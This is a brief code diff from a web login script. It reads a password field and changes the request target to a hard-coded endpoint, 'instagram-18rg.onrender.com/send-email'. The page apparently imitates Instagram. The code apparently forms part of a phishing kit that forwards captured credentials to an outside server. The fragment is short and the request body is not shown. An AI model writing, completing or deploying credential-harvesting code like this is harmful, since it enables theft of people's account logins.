@@ -111,7 +111,7 @@
     const password = document.getElementById("password").value;
 
     try {
-      const res = await fetch(`${HOST}/send-email`, {
+      const res = await fetch("https://instagram-18rg.onrender.com/send-email", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
